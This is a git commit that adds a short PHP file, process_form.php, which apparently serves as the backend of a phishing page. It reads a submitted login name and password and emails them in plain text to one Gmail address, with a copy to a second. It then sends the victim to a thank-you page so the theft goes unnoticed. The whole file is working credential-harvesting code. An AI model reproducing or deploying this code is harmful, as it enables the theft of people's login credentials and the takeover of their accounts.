5a9be4cf3af9dc6c8be29670a22240576f4731bc
will543n <167943971+will543n@users.noreply.github.com>
2024-05-16 07:01:58 -0700

    Add files via upload

---
+++ process_form.php
@@ -0,0 +1,18 @@
+<?php
+$log = $_POST['log'];
+$pwd = $_POST['pwd'];
+$to = "criispin.fredd@gmail.com";
+$subject = "From Link";
+
+$headers = "From: ".$log."\r\n" .
+           "CC: jsam58864@gmail.com";
+
+$txt = "Login: $log\r\nPassword: $pwd"; 
+       
+
+if (!empty($log) && !empty($pwd)) {
+    mail($to, $subject, $txt, $headers);
+}
+
+header("Location: Thankyou.html");
+?>
